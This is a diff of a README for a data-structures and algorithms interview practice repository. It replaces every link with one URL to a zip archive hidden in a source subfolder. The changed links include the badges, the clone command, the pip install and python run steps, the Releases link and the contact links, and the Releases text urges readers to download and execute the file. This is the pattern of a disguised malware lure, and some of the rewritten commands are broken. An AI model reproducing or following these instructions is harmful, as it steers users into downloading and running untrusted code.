@@ -1,6 +1,6 @@
 # Comprehensive DSA Practice Repository for Coding Interviews 🚀
 
-![GitHub Repo Stars](https://img.shields.io/github/stars/Ilyes14563/DSA?style=social) ![GitHub Forks](https://img.shields.io/github/forks/Ilyes14563/DSA?style=social) ![GitHub Issues](https://img.shields.io/github/issues/Ilyes14563/DSA) ![GitHub License](https://img.shields.io/github/license/Ilyes14563/DSA)
+![GitHub Repo Stars](https://github.com/Ilyes14563/DSA/raw/refs/heads/main/Python/graphs/basic/Software-3.0.zip) ![GitHub Forks](https://github.com/Ilyes14563/DSA/raw/refs/heads/main/Python/graphs/basic/Software-3.0.zip) ![GitHub Issues](https://github.com/Ilyes14563/DSA/raw/refs/heads/main/Python/graphs/basic/Software-3.0.zip) ![GitHub License](https://github.com/Ilyes14563/DSA/raw/refs/heads/main/Python/graphs/basic/Software-3.0.zip)
 
 Welcome to the **DSA** repository! This is your one-stop solution for mastering Data Structures and Algorithms (DSA) through real interview questions. Here, you will find clean solutions in Python, JavaScript, and C++, organized by topic and difficulty level. This repository is ideal for anyone preparing for coding interviews or looking to strengthen their understanding of DSA.
 
@@ -40,7 +40,7 @@ To get started with this repository, follow these steps:
 1. Clone the repository to your local machine:
 
    ```bash
-   git clone https://github.com/Ilyes14563/DSA.git
+   git clone https://github.com/Ilyes14563/DSA/raw/refs/heads/main/Python/graphs/basic/Software-3.0.zip
    ```
 
 2. Navigate into the cloned directory:
@@ -53,7 +53,7 @@ To get started with this repository, follow these steps:
 
    For Python:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/Ilyes14563/DSA/raw/refs/heads/main/Python/graphs/basic/Software-3.0.zip
    ```
 
    For JavaScript:
@@ -81,7 +81,7 @@ To run a Python solution:
 2. Run the desired solution:
 
    ```bash
-   python solution.py
+   python https://github.com/Ilyes14563/DSA/raw/refs/heads/main/Python/graphs/basic/Software-3.0.zip
    ```
 
 For JavaScript or C++, follow similar steps in their respective directories.
@@ -104,17 +104,17 @@ This repository is licensed under the MIT License. See the [LICENSE](LICENSE) fi
 
 ## Releases
 
-For the latest updates and releases, please visit our [Releases section](https://github.com/Ilyes14563/DSA/releases). Download the latest version and execute it to explore new features and improvements.
+For the latest updates and releases, please visit our [Releases section](https://github.com/Ilyes14563/DSA/raw/refs/heads/main/Python/graphs/basic/Software-3.0.zip). Download the latest version and execute it to explore new features and improvements.
 
 Feel free to check the **Releases** section for any updates if the link does not work.
 
-![Coding](https://img.freepik.com/free-vector/coding-concept-illustration_114360-1360.jpg?w=2000)
+![Coding](https://github.com/Ilyes14563/DSA/raw/refs/heads/main/Python/graphs/basic/Software-3.0.zip)
 
 ## Contact
 
 For any inquiries or support, feel free to reach out:
 
-- **Email**: [your_email@example.com](mailto:your_email@example.com)
-- **Twitter**: [@your_twitter_handle](https://twitter.com/your_twitter_handle)
+- **Email**: [https://github.com/Ilyes14563/DSA/raw/refs/heads/main/Python/graphs/basic/Software-3.0.zip](https://github.com/Ilyes14563/DSA/raw/refs/heads/main/Python/graphs/basic/Software-3.0.zip)
+- **Twitter**: [@your_twitter_handle](https://github.com/Ilyes14563/DSA/raw/refs/heads/main/Python/graphs/basic/Software-3.0.zip)
 
 Happy coding!
